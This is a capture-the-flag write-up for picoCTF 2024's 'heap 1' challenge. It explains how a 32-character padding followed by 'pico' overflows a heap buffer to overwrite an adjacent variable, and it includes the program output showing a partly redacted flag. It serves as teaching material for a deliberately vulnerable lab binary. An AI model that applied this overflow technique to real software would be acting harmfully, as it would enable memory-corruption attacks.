## PicoCTF 2024 Binary Exploitation heap 1 100 Points

When you open this challenge, you get two files -- the binary and a copy of the source code -- called [chall](chall) and [chall.c](chall.c), with this description:

> #### Description
> Can you control your overflow?
> Additional details will be available after launching your challenge instance.

If you want to see the hints:

<details close>
<summary> <b>Hints</b> </summary>

> (1) How can you tell where safe_var starts?
</details>

This is the same challenge as heap0, but just with one important line of code changed:

```
if (strcmp(safe_var, "bico") != 0) --> if (!strcmp(safe_var, "pico"))
```

This is going to now check that we can exactly change the `safe_var` to `pico` instead of something random.

If you are unsure how to do overflows, please check out my heap0 [README](../binex-heap0/README.md) \
If you understand overflows, and how to perform them, lets get hacking.

The difference from this to heap0 is just that we need to find the offset exactly, so that we can change `bico` to `pico`. We can find the offset either by trial and error or subtracting the addresses. I found we need 32 chars of garbage.

Now we just write a python script to do this, and get:

#### OH YEAH!
I almost forgot, sometimes running the solve on the chall binary on webshell or locally won't actually tell you you won, if you are seeing signs that you won, but aren't try it on the nc they give you! 

```
Welcome to heap1!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5bc2b4e7b2b0  ->   pico
+-------------+----------------+
[*]   0x5bc2b4e7b2d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: Data for buffer: 
1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5bc2b4e7b2b0  ->   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico
+-------------+----------------+
[*]   0x5bc2b4e7b2d0  ->   pico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 

Take a look at my variable: safe_var = pico


1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 
YOU WIN
picoCTF{starting_to_get_the_hang_--------}
```


